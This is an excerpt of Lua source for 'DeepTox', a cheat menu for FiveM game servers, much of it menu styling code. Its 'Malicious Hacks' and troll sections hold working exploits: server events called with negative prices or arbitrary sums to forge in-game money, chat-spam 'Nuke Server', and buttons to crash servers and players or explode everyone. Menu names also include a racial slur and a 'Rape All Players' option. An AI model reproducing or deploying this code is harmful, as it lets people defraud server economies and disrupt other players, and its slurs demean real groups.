DeepTox = { }
    ...
    function DeepTox.CreateMenu(id, title)
        -- Default settings

        menus[id] = { }
        menus[id].title = title
        menus[id].subTitle = 'DeepTox'
    ...
    function DeepTox.CreateSubMenu(id, parent, subTitle)
        if menus[parent] then
            DeepTox.CreateMenu(id, menus[parent].title)
    ...
    function DeepTox.CurrentMenu()
        return currentMenu
    end


    function DeepTox.OpenMenu(id)
        if id and menus[id] then
    ...
    function DeepTox.IsMenuOpened(id)
        return isMenuVisible(id)
    end


    function DeepTox.IsAnyMenuOpened()
    ...
    function DeepTox.IsMenuAboutToBeClosed()
        if menus[currentMenu] then
    ...
    function DeepTox.Button(text, subText)
    ...
    function DeepTox.MenuButton(text, id)
        if menus[id] then
            if DeepTox.Button(text) then
                setMenuVisible(currentMenu, false)
    ...
    function DeepTox.CheckBox(text, checked, callback)
        if DeepTox.Button(text, checked and '~h~~w~On' or "~h~~c~Off") then
            checked = not checked
    ...
    function DeepTox.ComboBox(text, items, currentIndex, selectedIndex, callback)
        ...
        if DeepTox.Button(text, selectedItem) then
    ...
    function DeepTox.SetMenuWidth(id, width)
        setMenuProperty(id, 'width', width)
    end


    function DeepTox.SetMenuX(id, x)
        setMenuProperty(id, 'x', x)
    end


    function DeepTox.SetMenuY(id, y)
        setMenuProperty(id, 'y', y)
    end


    function DeepTox.SetMenuMaxOptionCountOnScreen(id, count)
        setMenuProperty(id, 'maxOptionCount', count)
    end


    function DeepTox.SetTitle(id, title)
        setMenuProperty(id, 'title', title)
    end


    function DeepTox.SetTitleColor(id, r, g, b, a)
        setMenuProperty(id, 'titleColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a })
    end


    function DeepTox.SetTitleBackgroundColor(id, r, g, b, a)
        setMenuProperty(id, 'titleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a })
    end


    function DeepTox.SetTitleBackgroundSprite(id, textureDict, textureName)
        RequestStreamedTextureDict(textureDict)
        setMenuProperty(id, 'titleBackgroundSprite', { dict = textureDict, name = textureName })
    end

    function DeepTox.SetSpriteColor(id, r, g, b, a)
        setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
    end

    function DeepTox.SetSubTitle(id, text)
        setMenuProperty(id, 'subTitle', string.upper(text))
    end


    function DeepTox.SetMenuBackgroundColor(id, r, g, b, a)
        setMenuProperty(id, 'menuBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
    end


    function DeepTox.SetMenuTextColor(id, r, g, b, a)
        setMenuProperty(id, 'menuTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a })
    end

    function DeepTox.SetMenuSubTextColor(id, r, g, b, a)
        setMenuProperty(id, 'menuSubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a })
    end

    function DeepTox.SetMenuFocusColor(id, r, g, b, a)
        setMenuProperty(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a })
    end


    function DeepTox.SetMenuButtonPressedSound(id, name, set)
    ...
    function nukeserver()
        Citizen.CreateThread(function()
            ...
            for bs=0,9 do
                TriggerServerEvent("_chat:messageEntered","DeepTox",{141,211,255},"DeepTox TAPPED YOU - https://discord.gg/utH2qph")
            end
        ...
        function()
            while true do
                ...
                if rainbow then
                    ...
                    for i = 0, #allMenus do
                        DeepTox.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)
                    end
                    for i, dA in pairs(bd) do
                        DeepTox.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
                    end
                ...
                if animated then
                            Citizen.Wait(50)
                            for i = 0, #allMenus do
                                DeepTox.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1")
                            end
                            for i, dA in pairs(bd) do
                                DeepTox.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1")
                            ...
                            Citizen.Wait(50)
                            for i = 0, #allMenus do
                                DeepTox.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2")
                            end
                            for i, dA in pairs(bd) do
                                DeepTox.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2")
                            ...
                            Citizen.Wait(50)
                            for i = 0, #allMenus do
                                DeepTox.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3")
                            end
                            for i, dA in pairs(bd) do
                                DeepTox.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3")
                            ...
                            Citizen.Wait(50)
                            for i = 0, #allMenus do
                                DeepTox.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4")
                            end
                            for i, dA in pairs(bd) do
                                DeepTox.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4")
    ...
    Citizen.CreateThread(
        function()
            ...
            DeepTox.CreateMenu("MainMenu", "DeepTox")
            -- sprites shopui_title_gr_gunmod, mpshops = shopui_title_graphics_sale, assassinations = target1 , target3
            DeepTox.SetTitleBackgroundSprite("MainMenu", "shopui_title_clubhousemod", "shopui_title_clubhousemod")
            Citizen.CreateThread(function()
                while false do
                    DeepTox.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_1")
                    Citizen.Wait(50)
                    DeepTox.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_2")
                    Citizen.Wait(50)
                    DeepTox.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_3")
                    Citizen.Wait(50)
                    DeepTox.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_4")
                    Citizen.Wait(100)
                    DeepTox.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_5")
                    Citizen.Wait(100)
                end
            end)
            DeepTox.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
            DeepTox.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
            DeepTox.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
            DeepTox.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
            DeepTox.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
            DeepTox.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
            DeepTox.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
            DeepTox.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
            DeepTox.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
            DeepTox.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
            DeepTox.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
            DeepTox.CreateSubMenu("PlayerOptionsMenu", 'OnlinePlayersMenu', 'Player Options')
            DeepTox.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
            DeepTox.CreateSubMenu("NiggerCustoms", "VehMenu", "LC Customs")
            DeepTox.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
            DeepTox.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
            DeepTox.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
            DeepTox.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
            DeepTox.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
            DeepTox.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
            DeepTox.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
            DeepTox.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
            DeepTox.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
            DeepTox.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
            DeepTox.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
            DeepTox.CreateSubMenu("PerformanceMenu", "NiggerCustoms", "Performance Tuning")
            DeepTox.CreateSubMenu("SingleWepPlayer", 'PlayerOptionsMenu', 'Single Weapon Menu')
            DeepTox.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
            DeepTox.CreateSubMenu("Credits", "SettingsMenu", "Credits")
            DeepTox.CreateSubMenu("Themes", "SettingsMenu", "Themes")
            DeepTox.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
            DeepTox.CreateSubMenu("VehBoostMenu", "NiggerCustoms", "Vehicle Booster")
            DeepTox.CreateSubMenu("SpawnPedsMenu", "TrollMenu", "Spawn Peds")
            DeepTox.CreateSubMenu("CarTypeSelection", "VehMenu", "Vehicle Types")
            DeepTox.CreateSubMenu("CarOptions", "CarTypeSelection", "Car Types")
            DeepTox.CreateSubMenu("CarTypes", "VehMenu", "Vehicles")
            DeepTox.CreateSubMenu("tunings", "NiggerCustoms", "Extrerior Tuning")
            DeepTox.CreateSubMenu("performance", "NiggerCustoms", "Performance Tuning")
            DeepTox.CreateSubMenu("WeaponTypes", "WeaponMenu", "Weapons")
            DeepTox.CreateSubMenu("WeaponTypeSelection", "WeaponTypes", "Weapon")
            DeepTox.CreateSubMenu("WeaponOptions", "WeaponTypeSelection", "Weapon Options")
            DeepTox.CreateSubMenu("ModSelect", "WeaponOptions", "Weapon Mod Options")
            DeepTox.CreateSubMenu("BlockAreas", "TrollMenu", "Block Off Areas")
            DeepTox.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
            DeepTox.CreateSubMenu("PlayerSpawnPedsMenu", "PlayerTrollMenu", "Spawn Peds")
            for i, dA in pairs(bd) do
                DeepTox.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then
                DeepTox.CreateSubMenu("primary", dA.id, "Primary Paint")
                DeepTox.CreateSubMenu("secondary", dA.id, "Secondary Paint")
                DeepTox.CreateSubMenu("rimpaint", dA.id, "Wheel Paint")
                DeepTox.CreateSubMenu("classic1", "primary", "Classic Paint")
                DeepTox.CreateSubMenu("metallic1", "primary", "Metallic Paint")
                DeepTox.CreateSubMenu("matte1", "primary", "Matte Paint")
                DeepTox.CreateSubMenu("metal1", "primary", "Metal Paint")
                DeepTox.CreateSubMenu("classic2", "secondary", "Classic Paint")
                DeepTox.CreateSubMenu("metallic2", "secondary", "Metallic Paint")
                DeepTox.CreateSubMenu("matte2", "secondary", "Matte Paint")
                DeepTox.CreateSubMenu("metal2", "secondary", "Metal Paint")
                DeepTox.CreateSubMenu("classic3", "rimpaint", "Classic Paint")
                DeepTox.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint")
                DeepTox.CreateSubMenu("matte3", "rimpaint", "Matte Paint")
                DeepTox.CreateSubMenu("metal3", "rimpaint", "Metal Paint")
            end
        end
        for i, dA in pairs(be) do
            DeepTox.CreateSubMenu(dA.id, "performance", dA.name)
        end
        ...
        local SelectedPlayer
            ...
            while Enabled do
                ...
                if intro == 0 then
                    scaleform = Initialize("mp_big_message_freemode", "~r~DeepTox Menu Started")
                ...
                for i, dA in pairs(bd) do
                    if DeepTox.IsMenuOpened("tunings") then
                        if b8 then
                            if ba == "neon" then
                    ...
                    if DeepTox.IsMenuOpened(dA.id) then
                        if dA.id == "wheeltypes" then
                            if DeepTox.Button("Sport Wheels") then
                                SetVehicleWheelType(veh, 0)
                            elseif DeepTox.Button("Muscle Wheels") then
                                SetVehicleWheelType(veh, 1)
                            elseif DeepTox.Button("Lowrider Wheels") then
                                SetVehicleWheelType(veh, 2)
                            elseif DeepTox.Button("SUV Wheels") then
                                SetVehicleWheelType(veh, 3)
                            elseif DeepTox.Button("Offroad Wheels") then
                                SetVehicleWheelType(veh, 4)
                            elseif DeepTox.Button("Tuner Wheels") then
                                SetVehicleWheelType(veh, 5)
                            elseif DeepTox.Button("High End Wheels") then
                        ...
                        elseif dA.id == "extra" then
                            ...
                            for i, dA in pairs(dF) do
                                ...
                                if DeepTox.Button(dA.menuName, pricestring) then
                        ...
                        elseif dA.id == "headlight" then
                            ...
                            for dK, dA in pairs(bo) do
                                ...
                                if DeepTox.Button(dA.name, pricetext) then
                                    if not bg then
                                        bi = "headlight"
                                        bk = false
                        ...
                        elseif dA.id == "neon" then
                            ...
                            for i, dA in pairs(colors) do
                                ...
                                if DeepTox.Button(i, pricestring) then
                                    if not b8 then
                                        ba = "neon"
                        ...
                        elseif dA.id == "paint" then
                            if DeepTox.MenuButton("Primary Paint", "primary") then
                            elseif DeepTox.MenuButton("Secondary Paint", "secondary") then
                            elseif DeepTox.MenuButton("Wheel Paint", "rimpaint") then
                            end
                            DeepTox.Display()
                        else
                            ...
                            for dG, dH in pairs(as) do
                                ...
                                if DeepTox.Button(dH.menuName, price) then
                                    if not b8 then
                                        ba = dA.id
            ...
            if DeepTox.Button("Stock "..dA.name, pricestock) then
                SetVehicleMod(veh, dA.id, -1)
            elseif DeepTox.Button(dA.name.." Upgrade 1", price1) then
                SetVehicleMod(veh, dA.id, 0)
            elseif DeepTox.Button(dA.name.." Upgrade 2", price2) then
                SetVehicleMod(veh, dA.id, 1)
            elseif DeepTox.Button(dA.name.." Upgrade 3", price3) then
                SetVehicleMod(veh, dA.id, 2)
            elseif dA.id ~= 13 and dA.id ~= 12 and DeepTox.Button(dA.name.." Upgrade 4", price4) then
                SetVehicleMod(veh, dA.id, 3) end; DeepTox.Display()
            end
        end

                if DeepTox.IsMenuOpened("MainMenu") then
                    drawNotification("~r~DeepTox")
                    if DeepTox.MenuButton("-- Self Menu --", "SelfMenu") then
                    elseif DeepTox.MenuButton("-- Online Players --", "OnlinePlayersMenu") then
                    elseif DeepTox.MenuButton("-- Teleport Menu --", "TeleportMenu") then
                    elseif DeepTox.MenuButton("-- Weapon Menu -- " , "WeaponMenu") then
                    elseif DeepTox.MenuButton("-- Vehicle Menu --", "VehMenu") then
                    elseif DeepTox.MenuButton("-- Malicious Hacks --", "MaliciousMenu") then
                    elseif DeepTox.MenuButton("-- Trolling Options --", "TrollMenu") then
                    elseif DeepTox.MenuButton("-- ESX Options --", "ESXMenu") then
                    elseif DeepTox.Button("-- Disable Menu --") then
                        Enabled = false
                    end
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("VRPMenu") then
                    if DeepTox.Button('VRP PayGarage 100$') then
                        TriggerServerEvent('lscustoms:payGarage', {costs = -100})
                    elseif DeepTox.Button('VRP PayGarage 1000$') then
                        TriggerServerEvent('lscustoms:payGarage', {costs = -1000})
                    elseif DeepTox.Button('VRP PayGarage 10 000$') then
                        TriggerServerEvent('lscustoms:payGarage', {costs = -10000})
                    elseif DeepTox.Button('VRP PayGarage 100 000$') then
                        TriggerServerEvent('lscustoms:payGarage', {costs = -100000})
                    elseif DeepTox.Button('VRP Get Driver Licence') then
                        TriggerServerEvent('dmv:success')
                    elseif DeepTox.Button('VRP Bank Deposit') then
                        local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                        TriggerServerEvent('bank:deposit', amount)
                    elseif DeepTox.Button('VRP Bank Whithdraw') then
                        local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                        TriggerServerEvent('bank:withdraw', amount)
                    elseif DeepTox.Button('VRP Slot Machine') then
                        local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                        TriggerServerEvent('vrp_slotmachine:server:2', amount)
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("SettingsMenu") then
                    if DeepTox.ComboBox("Menu X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                        currentMenuX = currentIndex
                        selectedMenuX = selectedIndex
                        for i = 0, #allMenus do
                            DeepTox.SetMenuX(allMenus[i], menuX[currentMenuX])
                        end
                        end)
                        then
                    elseif DeepTox.ComboBox("Menu Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                        currentMenuY = currentIndex
                        selectedMenuY = selectedIndex
                        for i = 0, #allMenus do
                            DeepTox.SetMenuY(allMenus[i], menuY[currentMenuY])
                        end
                        end)
                        then
                    elseif DeepTox.CheckBox("Discord Rich Presence", discordPresence, function(enabled) discordPresence = enabled end) then
                    elseif DeepTox.MenuButton("Credits", "Credits") then
                    elseif DeepTox.MenuButton("Themes", "Themes") then
                    elseif DeepTox.MenuButton("Info", "InfoMenu") then
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("InfoMenu") then
                    if DeepTox.Button("Build 0.9") then
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("Themes") then
                    if DeepTox.Button("Original") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            DeepTox.SetTitleBackgroundSprite(allMenus[i], "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(allMenus[i], 255, 0, 0, 255)
                        end
                        for i, dA in pairs(bd) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(dA.id, 255, 0, 0, 255)
                        end
                        for i, dA in pairs(be) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(dA.id, 255, 0, 0, 255)
                        end
                    elseif DeepTox.Button("Original Rainbow") then
                        animated = false
                        rainbow = true
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                    ...
                    elseif DeepTox.Button("Original White") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                             DeepTox.SetTitleBackgroundSprite(allMenus[i], "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(allMenus[i], 255, 255, 255, 255)
                        end
                        for i, dA in pairs(bd) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end
                        for i, dA in pairs(be) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end
                    elseif DeepTox.Button("Original Green") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            DeepTox.SetTitleBackgroundSprite(allMenus[i], "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(allMenus[i], 0, 255, 0, 255)
                        end
                        for i, dA in pairs(bd) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(dA.id, 0, 255, 0, 255)
                        end
                        for i, dA in pairs(be) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(dA.id, 0, 255, 0, 255)
                        end
                    elseif DeepTox.Button("Original Blue") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            DeepTox.SetTitleBackgroundSprite(allMenus[i], "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(allMenus[i], 0, 0, 255, 255)
                        end
                        for i, dA in pairs(bd) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(dA.id, 0, 0, 255, 255)
                        end
                        for i, dA in pairs(be) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shopui_title_gr_gunmod", "shopui_title_gr_gunmod")
                            DeepTox.SetSpriteColor(dA.id, 0, 0, 255, 255)
                        end
                    elseif DeepTox.Button("Gradient Black") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            DeepTox.SetTitleBackgroundSprite(allMenus[i], "shared", "bggradient_16x512")
                            DeepTox.SetSpriteColor(allMenus[i], 0, 0, 255, 255)
                        end
                        for i, dA in pairs(bd) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shared", "bggradient_16x512")
                            DeepTox.SetSpriteColor(dA.id, 0, 0, 255, 255)
                        end
                        for i, dA in pairs(be) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "shared", "bggradient_16x512")
                    ...
                    elseif DeepTox.Button("Animated") then
                        for i = 0, #allMenus do
                            DeepTox.SetSpriteColor(allMenus[i], 255, 255, 255, 255)
                        end
                        rainbow = false
                        animated = true
                    elseif DeepTox.Button("God") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            DeepTox.SetTitleBackgroundSprite(allMenus[i], "assassinations", "target1")
                            DeepTox.SetSpriteColor(allMenus[i], 255, 255, 255, 255)
                        end
                        for i, dA in pairs(bd) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "assassinations", "target1")
                            DeepTox.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end
                        for i, dA in pairs(be) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "assassinations", "target1")
                    ...
                    elseif DeepTox.Button("God2") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            DeepTox.SetTitleBackgroundSprite(allMenus[i], "assassinations", "target3")
                            DeepTox.SetSpriteColor(allMenus[i], 255, 255, 255, 255)
                        end
                        for i, dA in pairs(bd) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "assassinations", "target3")
                            DeepTox.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end
                        for i, dA in pairs(be) do
                            DeepTox.SetTitleBackgroundSprite(dA.id, "assassinations", "target3")
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("Credits") then
                    if DeepTox.Button("Made By: Mestari Halla-aho#7167") then
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("WeaponTypes") then
                    for e0, ev in pairs(b7) do
                        if DeepTox.MenuButton(""..e0, "WeaponTypeSelection") then
                            dy = ev
                        end
                    end

                    DeepTox.Display()
                            elseif DeepTox.IsMenuOpened("WeaponTypeSelection") then
                                for e0, ev in pairs(dy) do
                                    if DeepTox.MenuButton(ev.name, "WeaponOptions") then
                                        dz = ev
                                    end
                                 end

                    DeepTox.Display()
                 elseif DeepTox.IsMenuOpened("WeaponOptions") then
                    if DeepTox.Button("Spawn Weapon") then
                        GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
                    end
                    if DeepTox.Button("Remove Weapon") then
                        RemoveWeaponFromPed(GetPlayerPed(-1), GetHashKey(dz.id))
                    end
                    if DeepTox.Button("Add Ammo") then
                        SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000)
                    end
                                    if DeepTox.CheckBox("Infinite ~s~Ammo", dz.bInfAmmo, function(ew) end) then
                                    ...
                                    for e0, ev in pairs(dz.mods) do
                                        if DeepTox.MenuButton(""..e0, "ModSelect") then
                                            dA = ev
                                        end
                                    end

                                    DeepTox.Display()
                                elseif DeepTox.IsMenuOpened("ModSelect") then
                                    for _, ev in pairs(dA) do
                                        if DeepTox.Button(ev.name) then
                                            GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                                        elseif DeepTox.Button("~r~Remove " .. ev.name) then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("TrollMenu") then
                    if DeepTox.Button("ESX Server Crasher") then
                    ...
                    elseif DeepTox.Button("ESX Send All To Jail") then
                        for i = 1, 128 do
                    ...
                    elseif DeepTox.MenuButton("Block Off Areas", "BlockAreas") then
                    elseif DeepTox.MenuButton("Spawn Peds On Players", "SpawnPedsMenu") then
                    elseif DeepTox.Button("Nuke Server") then
                        nukeserver()
                    elseif DeepTox.Button("Rape All Players") then
                        runOnAll(rape)
                    elseif DeepTox.CheckBox("Spam Chat", spam, function(enabled) spam = enabled end) then
                    elseif DeepTox.Button("Change Spam Message") then
                        local temp = KeyboardInput("Enter Message Here", "", 10000)
                        message = temp
                    elseif DeepTox.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
                    elseif DeepTox.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
                    elseif DeepTox.CheckBox("Explode Everyone Shooting", shootBomb, function(enabled) shootBomb = enabled end) then
                    elseif DeepTox.CheckBox("Spawn Shit On Everyone", sall, function(enabled) sall = enabled end) then
                    elseif DeepTox.CheckBox("Block Everyone From Running", runtog, function(enabled) runtog = enabled end) then
                    elseif DeepTox.Button("Kick Everyone Out Of Car") then
                        for i = 0, 128 do
                            ClearPedTasksImmediately(GetPlayerPed(i))
                        end
                    elseif DeepTox.Button("Crash All Players") then
                       runOnAll(crash)
                    elseif DeepTox.Button("Fake Message") then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("BlockAreas") then
                    if DeepTox.Button("Car Dealer") then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("tunings") then
                    veh = GetVehiclePedIsUsing(PlayerPedId())
                    for i, dA in pairs(bd) do
                        if dA.
                    id == "extra"
                    and# checkValidVehicleExtras()  ~= 0 then
                    if DeepTox.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
                    then
                    if DeepTox.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
                    then
                    if DeepTox.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes"
                    then
                    if DeepTox.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
                    then
                    if DeepTox.MenuButton(dA.name, dA.id) then end
                    ...
                    if DeepTox.Button("Xenon Headlight", xenonStatus) then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("performance") then
                    veh = GetVehiclePedIsUsing(PlayerPedId())
                    for i, dA in pairs(be) do
                        if DeepTox.MenuButton(dA.name, dA.id) then
                        end
                    end
                    ...
                    if DeepTox.Button("Turbo Tune", turboStatus) then
                    ...
                    DeepTox.Display() elseif DeepTox.IsMenuOpened("primary") then DeepTox.MenuButton("Classic", "classic1") DeepTox.MenuButton("Metallic", "metallic1") DeepTox.MenuButton("Matte", "matte1") DeepTox.MenuButton("Metal", "metal1") DeepTox.Display() elseif DeepTox.IsMenuOpened("secondary") then DeepTox.MenuButton("Classic", "classic2") DeepTox.MenuButton("Metallic", "metallic2") DeepTox.MenuButton("Matte", "matte2") DeepTox.MenuButton("Metal", "metal2") DeepTox.Display() elseif DeepTox.IsMenuOpened("rimpaint") then DeepTox.MenuButton("Classic", "classic3") DeepTox.MenuButton("Metallic", "metallic3") DeepTox.MenuButton("Matte", "matte3") DeepTox.MenuButton("Metal", "metal3") DeepTox.Display() elseif DeepTox.IsMenuOpened("classic1") then
                    ...
                    end end; curprim, cursec = GetVehicleColours(veh) if DeepTox.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; DeepTox.Display() elseif DeepTox.IsMenuOpened("metallic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; DeepTox.Display() elseif DeepTox.IsMenuOpened("matte1") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; DeepTox.Display() elseif DeepTox.IsMenuOpened("metal1") then
                    ...
                    if not b8 then ba = "paint"
